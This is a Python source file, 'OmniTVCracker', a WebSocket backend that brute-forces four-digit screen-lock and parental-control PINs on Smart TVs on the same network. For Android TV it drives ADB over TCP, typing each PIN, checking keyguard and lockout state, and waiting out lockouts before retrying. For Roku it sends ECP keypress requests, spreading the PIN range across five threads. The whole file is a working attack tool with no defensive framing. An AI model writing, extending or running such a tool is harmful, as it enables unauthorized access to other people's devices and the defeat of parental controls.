#!/usr/bin/env python3
"""
OmniTVCracker - Backend Real v4.0
WebSocket server para comunicarse con la interfaz frontend.
Ejecuta intentos REALES de PIN sobre Smart TVs en la misma red.

Soporta:
  - Android TV  → ADB over TCP  (adb connect IP:PORT)
  - Roku        → ECP HTTP      (POST /keypress/Lit_X)
  - Samsung / LG → TCP reachability check (protocolo SSAP/SmartView en roadmap)

Requisitos:
  pip install websockets
  + ADB (Android Platform Tools) en PATH para Android TV
"""

import asyncio
import websockets
import json
import subprocess
import threading
import time
import os
import socket
import re
import sys
from concurrent.futures import ThreadPoolExecutor

VERSION = "4.0-REAL"
WS_HOST = "localhost"
WS_PORT = 8765

# ════════════════════════════════════════════════════════
#  ADB UTILITIES
# ════════════════════════════════════════════════════════

def find_adb():
    """Busca adb.exe en ubicaciones comunes y en el PATH."""
    user = os.environ.get("USERNAME", "")
    candidates = [
        "adb",
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Android", "Sdk",
                     "platform-tools", "adb.exe"),
        rf"C:\Users\{user}\AppData\Local\Android\Sdk\platform-tools\adb.exe",
        r"C:\Android\platform-tools\adb.exe",
        r"C:\Program Files\Android\platform-tools\adb.exe",
        r"C:\Program Files (x86)\Android\platform-tools\adb.exe",
    ]
    for c in candidates:
        if not c:
            continue
        try:
            r = subprocess.run([c, "version"], capture_output=True, timeout=3)
            if r.returncode == 0:
                return c
        except Exception:
            continue
    return None

ADB = find_adb()


def run_adb(args, target=None, timeout=8):
    """Ejecuta un comando adb. Si target='IP:PORT' inyecta -s."""
    if not ADB:
        return "", "ADB no disponible", -1
    cmd = [ADB]
    if target:
        cmd += ["-s", target]
    cmd += args
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, encoding="utf-8", errors="replace")
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout ADB", -1
    except Exception as e:
        return "", str(e), -1


def adb_connect(ip, port, timeout=12):
    """Conecta via ADB. Retorna (ok, mensaje)."""
    out, err, _ = run_adb(["connect", f"{ip}:{port}"], timeout=timeout)
    full = (out + err).lower()
    ok = ("connected to" in full or "already connected" in full) and "unable" not in full
    return ok, (out + err).strip()


def adb_disconnect(ip, port):
    run_adb(["disconnect", f"{ip}:{port}"], timeout=5)


def adb_is_keyguard_showing(target):
    """
    Devuelve True/False/None sobre si el keyguard (bloqueo de pantalla) está activo.
    None = estado indeterminado.
    """
    out, _, _ = run_adb(["shell", "dumpsys", "window"], target=target, timeout=6)
    # Android 8+
    m = re.search(r"mKeyguardShowing=(\w+)", out)
    if m:
        return m.group(1).lower() == "true"
    # Variante alternativa
    m = re.search(r"KeyguardShowing=(\w+)", out)
    if m:
        return m.group(1).lower() == "true"
    # Verificar foco actual
    m = re.search(r"mCurrentFocus=Window\{[^}]+\s+(\S+)\}", out)
    if m:
        focus = m.group(1).lower()
        if "keyguard" in focus or "lockscreen" in focus:
            return True
    return None


def adb_wakeup(target):
    """Despierta la pantalla del TV."""
    run_adb(["shell", "input", "keyevent", "KEYCODE_WAKEUP"], target=target, timeout=4)
    time.sleep(0.15)


def adb_clear_input(target):
    """Limpia el campo de texto actual con BACK + HOME."""
    run_adb(["shell", "input", "keyevent", "KEYCODE_BACK"], target=target, timeout=3)
    time.sleep(0.1)


def adb_enter_pin_text(target, pin_str):
    """Ingresa el PIN usando 'input text' (método rápido, funciona en muchos TVs)."""
    run_adb(["shell", "input", "text", pin_str], target=target, timeout=4)
    time.sleep(0.05)
    run_adb(["shell", "input", "keyevent", "KEYCODE_ENTER"], target=target, timeout=3)


def adb_enter_pin_keyevents(target, pin_str):
    """Ingresa el PIN dígito a dígito via KEYCODE (más compatible con TVs que usan numpad)."""
    keycode_map = {
        "0": "KEYCODE_0", "1": "KEYCODE_1", "2": "KEYCODE_2",
        "3": "KEYCODE_3", "4": "KEYCODE_4", "5": "KEYCODE_5",
        "6": "KEYCODE_6", "7": "KEYCODE_7", "8": "KEYCODE_8",
        "9": "KEYCODE_9"
    }
    for d in pin_str:
        kc = keycode_map.get(d, f"KEYCODE_{d}")
        run_adb(["shell", "input", "keyevent", kc], target=target, timeout=3)
        time.sleep(0.06)
    run_adb(["shell", "input", "keyevent", "KEYCODE_ENTER"], target=target, timeout=3)


def adb_check_lockout(target):
    """Detecta si el TV está en estado de lockout por demasiados intentos."""
    out, _, _ = run_adb(["shell", "dumpsys", "window"], target=target, timeout=6)
    low = out.lower()
    return "too many" in low or "lockout" in low or "try again" in low


def adb_try_pin(target, pin_str, method="text"):
    """
    Intenta el PIN en Android TV.
    Retorna: ('success'|'failed'|'lockout'|'error', mensaje)
    """
    try:
        adb_wakeup(target)

        # Estado antes del intento
        before = adb_is_keyguard_showing(target)

        # Ingresar PIN
        if method == "keyevent":
            adb_enter_pin_keyevents(target, pin_str)
        else:
            adb_enter_pin_text(target, pin_str)

        time.sleep(0.45)  # Esperar respuesta del UI

        # Verificar lockout
        if adb_check_lockout(target):
            return "lockout", f"Demasiados intentos. TV bloqueada temporalmente."

        # Estado después del intento
        after = adb_is_keyguard_showing(target)

        if before is True and after is False:
            return "success", f"✔ PIN {pin_str} CORRECTO — Keyguard desbloqueado"
        elif after is True:
            return "failed", f"PIN {pin_str} incorrecto"
        elif before is False and after is False:
            # Pantalla no estaba bloqueada — posible PIN de control parental
            # Intentamos detectar cambio de actividad
            out, _, _ = run_adb(["shell", "dumpsys", "activity", "activities"], target=target, timeout=5)
            if "Resumed:" in out:
                resumed = re.search(r"Resumed:\s+(\S+)", out)
                if resumed:
                    activity = resumed.group(1).lower()
                    if "pin" in activity or "lock" in activity or "parental" in activity:
                        return "failed", f"PIN {pin_str} — diálogo PIN aún activo"
                    else:
                        return "success", f"✔ PIN {pin_str} CORRECTO — Actividad desbloqueada"
            return "failed", f"PIN {pin_str} — estado ambiguo (pantalla no estaba bloqueada)"
        else:
            return "failed", f"PIN {pin_str} — estado indeterminado"

    except Exception as e:
        return "error", f"Excepción ADB: {e}"


# ════════════════════════════════════════════════════════
#  ROKU ECP
# ════════════════════════════════════════════════════════

def roku_post(ip, port, path, timeout=3):
    """Envía un POST a Roku ECP."""
    import urllib.request
    import urllib.error
    try:
        url = f"http://{ip}:{port}{path}"
        req = urllib.request.Request(url, method="POST", data=b"")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.URLError as e:
        return -1, str(e)
    except Exception as e:
        return -1, str(e)


def roku_try_pin(ip, port, pin_str):
    """
    Envía un PIN a Roku via ECP (keypresses).
    NOTA: Roku ECP no devuelve si el PIN fue correcto.
    El operador debe verificar visualmente en el TV.
    Retorna: ('sent'|'error', mensaje)
    """
    for d in pin_str:
        status, msg = roku_post(ip, port, f"/keypress/Lit_{d}")
        if status == -1:
            return "error", f"No se pudo conectar con Roku en {ip}:{port}: {msg}"
        time.sleep(0.08)
    status, _ = roku_post(ip, port, "/keypress/Enter")
    if status == -1:
        return "error", "Roku: Error enviando Enter"
    return "sent", f"PIN {pin_str} → Roku (verificar visualmente en TV)"


# ════════════════════════════════════════════════════════
#  TCP REACHABILITY
# ════════════════════════════════════════════════════════

def tcp_reachable(ip, port, timeout=3):
    """Verifica si un puerto TCP está abierto."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        rc = s.connect_ex((ip, int(port)))
        s.close()
        return rc == 0
    except Exception:
        return False


# ════════════════════════════════════════════════════════
#  ESTADO GLOBAL
# ════════════════════════════════════════════════════════

class AppState:
    def __init__(self):
        self.reset()

    def reset(self):
        self.running = False
        self.paused = False
        self.found = False
        self.found_pin = None
        self.device = "android"
        self.ip = "192.168.1.50"
        self.port = 5555
        self.entry_method = "text"   # "text" | "keyevent"
        self.stop_event = threading.Event()
        self.pause_event = threading.Event()
        self.pause_event.set()       # set = corriendo, clear = pausado
        self.lock = threading.Lock()
        self.ws = None
        self.ws_loop = None
        self.total_tested = 0
        self.active_threads = 0
        self.executor = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cracker")


S = AppState()


# ════════════════════════════════════════════════════════
#  MESSAGING (thread-safe)
# ════════════════════════════════════════════════════════

def send_ws(msg_type, **kwargs):
    """Envía un mensaje JSON al frontend de forma thread-safe."""
    if S.ws and S.ws_loop and not S.ws_loop.is_closed():
        try:
            msg = json.dumps({"type": msg_type, **kwargs})
            asyncio.run_coroutine_threadsafe(S.ws.send(msg), S.ws_loop)
        except Exception:
            pass


# ════════════════════════════════════════════════════════
#  WORKER DE CRACKEO — 5 HILOS PARALELOS REALES
# ════════════════════════════════════════════════════════

# Colores de hilos para visualización (fijos por thread_id)
THREAD_COLORS = [
    ("HILO 1", "VERDE"),
    ("HILO 2", "AZUL"),
    ("HILO 3", "AMARILLO"),
    ("HILO 4", "MAGENTA"),
    ("HILO 5", "CIAN"),
]

# Semáforo ADB: solo 1 comando ADB a la vez (TV maneja 1 entrada simultánea)
# Para Roku ECP el semáforo se relaja a 3 concurrentes
_adb_sem = threading.Semaphore(1)


def crack_worker(thread_id, pin_start, pin_end):
    """
    Worker real para un rango específico de PINs.
    Cada uno de los 5 hilos recibe su rango propio y avanza independientemente.
    El semáforo _adb_sem serializa las llamadas al TV (una a la vez).
    """
    tname, tcolor = THREAD_COLORS[thread_id]
    current = pin_start
    lockout_wait = 0

    send_ws("log",
            text=f"[{tname}] Iniciando desde {str(pin_start).zfill(4)} → {str(pin_end).zfill(4)}",
            level="ok")

    try:
        while current <= pin_end:
            # ── Stop ──
            if S.stop_event.is_set() or S.found:
                break

            # ── Pausa ──
            S.pause_event.wait()
            if S.stop_event.is_set():
                break

            # ── Lockout wait ──
            if lockout_wait > 0:
                send_ws("log",
                        text=f"[{tname}] ⏳ Lockout — esperando {lockout_wait}s...",
                        level="warn")
                waited = 0
                while waited < lockout_wait and not S.stop_event.is_set():
                    time.sleep(1)
                    waited += 1
                lockout_wait = 0
                if S.stop_event.is_set():
                    break

            pin_str = str(current).zfill(4)

            # Actualizar contador global
            with S.lock:
                S.total_tested += 1
                total = S.total_tested

            # Notificar intento al frontend (este hilo específico)
            send_ws("attempt",
                    thread=thread_id,
                    thread_name=tname,
                    thread_color=tcolor,
                    pin=pin_str,
                    total=total)

            # ── PRUEBA REAL (serializada con semáforo) ──
            result, msg = "failed", ""

            if S.device == "android":
                with _adb_sem:
                    if S.stop_event.is_set() or S.found:
                        break
                    target = f"{S.ip}:{S.port}"
                    result, msg = adb_try_pin(target, pin_str, S.entry_method)

            elif S.device == "roku":
                # Roku ECP es HTTP — permite hasta 2 concurrentes sin conflicto
                result, msg = roku_try_pin(S.ip, S.port, pin_str)
                time.sleep(0.2)

            elif S.device in ("samsung", "lg"):
                send_ws("log",
                        text="⚠ Samsung/LG: protocolo en desarrollo. Usa Android TV o Roku.",
                        level="warn")
                S.stop_event.set()
                break

            # ── Resultado ──
            if result == "success":
                with S.lock:
                    if not S.found:
                        S.found = True
                        S.found_pin = pin_str
                        send_ws("found", thread=thread_id, pin=pin_str, message=msg)
                        S.stop_event.set()
                break

            elif result == "lockout":
                lockout_wait = 35
                send_ws("result", thread=thread_id, pin=pin_str,
                        result="lockout", message=msg)
                continue   # No incrementar — reintentar mismo PIN

            elif result == "error":
                send_ws("result", thread=thread_id, pin=pin_str,
                        result="error", message=msg)
                time.sleep(1)

            elif result == "sent":
                send_ws("result", thread=thread_id, pin=pin_str,
                        result="sent", message=msg)

            current += 1

    except Exception as e:
        send_ws("log", text=f"[{tname}] Error crítico: {e}", level="error")

    finally:
        with S.lock:
            active = S.active_threads - 1
            S.active_threads = active

        send_ws("log",
                text=f"[{tname}] Hilo finalizado. "
                     f"Rango {str(pin_start).zfill(4)}–{str(pin_end).zfill(4)} completado.",
                level="info")

        # Si todos los hilos terminaron y no se encontró el PIN
        if active == 0 and not S.found and not S.stop_event.is_set():
            S.running = False
            send_ws("exhausted",
                    total=S.total_tested,
                    message=f"Todos los hilos completaron sus rangos sin éxito.")
        elif active == 0:
            S.running = False


# ════════════════════════════════════════════════════════
#  WEBSOCKET HANDLER
# ════════════════════════════════════════════════════════

async def ws_handler(websocket, path=None):
    S.ws = websocket
    S.ws_loop = asyncio.get_event_loop()
    addr = getattr(websocket, "remote_address", "?")
    print(f"[+] Frontend conectado → {addr}")

    # Anunciar capacidades al frontend
    await websocket.send(json.dumps({
        "type": "init",
        "adb_available": ADB is not None,
        "adb_path": ADB or "No encontrado — instala Android Platform Tools",
        "version": VERSION
    }))

    try:
        async for raw in websocket:
            try:
                msg = json.loads(raw)
            except Exception:
                continue

            cmd = msg.get("cmd", "")

            # ── CONNECT ──────────────────────────────────
            if cmd == "connect":
                ip     = msg.get("ip", "192.168.1.50").strip()
                port   = int(msg.get("port", 5555))
                device = msg.get("device", "android")

                S.ip, S.port, S.device = ip, port, device

                await websocket.send(json.dumps({
                    "type": "log",
                    "text": f"Verificando conexión a {ip}:{port} [{device.upper()}]...",
                    "level": "info"
                }))

                loop = asyncio.get_event_loop()

                if device == "android":
                    if not ADB:
                        await websocket.send(json.dumps({
                            "type": "connect_result",
                            "success": False,
                            "message": (
                                "ADB no encontrado. Descarga Android Platform Tools:\n"
                                "https://developer.android.com/tools/releases/platform-tools"
                            )
                        }))
                        continue
                    ok, out = await loop.run_in_executor(S.executor, adb_connect, ip, port)
                    await websocket.send(json.dumps({
                        "type": "connect_result",
                        "success": ok,
                        "message": out
                    }))
                else:
                    ok = await loop.run_in_executor(S.executor, tcp_reachable, ip, port)
                    await websocket.send(json.dumps({
                        "type": "connect_result",
                        "success": ok,
                        "message": f"Puerto {port} {'accesible ✔' if ok else 'NO accesible ✗'} en {ip}"
                    }))

            # ── START — lanza 5 hilos reales desde sus rangos ─────
            elif cmd == "start":
                if S.running:
                    continue

                S.reset()
                S.device       = msg.get("device", "android")
                S.ip           = msg.get("ip", S.ip).strip()
                S.port         = int(msg.get("port", S.port))
                S.entry_method = msg.get("entry_method", "text")
                pin_start      = int(msg.get("pin_start", 0))
                pin_end        = int(msg.get("pin_end",   9999))
                S.running      = True

                # Dividir rango en 5 sub-rangos iguales
                total_pins = pin_end - pin_start + 1
                chunk      = total_pins // 5
                ranges = []
                for i in range(5):
                    rs = pin_start + i * chunk
                    re = rs + chunk - 1 if i < 4 else pin_end
                    ranges.append((rs, re))

                S.active_threads = 5

                await websocket.send(json.dumps({
                    "type": "started",
                    "message": (
                        f"5 hilos reales lanzados contra {S.ip}:{S.port} [{S.device.upper()}] — "
                        f"rangos: " +
                        " | ".join(f"H{i+1}:{str(rs).zfill(4)}–{str(re).zfill(4)}"
                                   for i, (rs, re) in enumerate(ranges))
                    ),
                    "ranges": [{"thread": i, "start": rs, "end": re}
                               for i, (rs, re) in enumerate(ranges)]
                }))

                for tid, (rs, re) in enumerate(ranges):
                    t = threading.Thread(
                        target=crack_worker,
                        args=(tid, rs, re),
                        daemon=True,
                        name=f"cracker-{tid}"
                    )
                    t.start()

            # ── PAUSE ────────────────────────────────────
            elif cmd == "pause":
                if S.running and not S.paused:
                    S.paused = True
                    S.pause_event.clear()
                    await websocket.send(json.dumps({"type": "paused"}))

            # ── RESUME ───────────────────────────────────
            elif cmd == "resume":
                if S.paused:
                    S.paused = False
                    S.pause_event.set()
                    await websocket.send(json.dumps({"type": "resumed"}))

            # ── STOP ─────────────────────────────────────
            elif cmd == "stop":
                S.stop_event.set()
                S.pause_event.set()   # desbloquear si estaba pausado
                S.running = False
                S.paused = False
                await websocket.send(json.dumps({"type": "stopped"}))

            # ── DISCONNECT ADB ───────────────────────────
            elif cmd == "disconnect":
                if S.device == "android" and ADB:
                    loop = asyncio.get_event_loop()
                    await loop.run_in_executor(S.executor, adb_disconnect, S.ip, S.port)
                await websocket.send(json.dumps({
                    "type": "log",
                    "text": f"ADB desconectado de {S.ip}:{S.port}",
                    "level": "info"
                }))

            # ── SET_METHOD ───────────────────────────────
            elif cmd == "set_method":
                S.entry_method = msg.get("method", "text")
                await websocket.send(json.dumps({
                    "type": "log",
                    "text": f"Método de entrada ADB: {S.entry_method}",
                    "level": "info"
                }))

    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        print(f"[!] Error WS handler: {e}")
    finally:
        # Limpiar al desconectar
        S.stop_event.set()
        S.pause_event.set()
        S.ws = None
        print(f"[-] Frontend desconectado")




# ════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════

async def main():
    banner = f"""
╔══════════════════════════════════════════════════════╗
║   OmniTVCracker  Backend Real  v{VERSION:<20}║
╠══════════════════════════════════════════════════════╣"""
    print(banner)

    if ADB:
        print(f"║  ✔ ADB encontrado: {ADB:<33}║")
    else:
        print("║  ✗ ADB no encontrado                                 ║")
        print("║    → developer.android.com/tools/releases/platform-tools ║")

    print(f"║  WebSocket: ws://{WS_HOST}:{WS_PORT:<35}║")
    print("╚══════════════════════════════════════════════════════╝")
    print("  Esperando conexión del frontend...\n")

    async with websockets.serve(ws_handler, WS_HOST, WS_PORT):
        await asyncio.Future()   # Corre indefinidamente


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Backend detenido.")
    except Exception as e:
        print(f"[!] Error fatal: {e}")
        sys.exit(1)
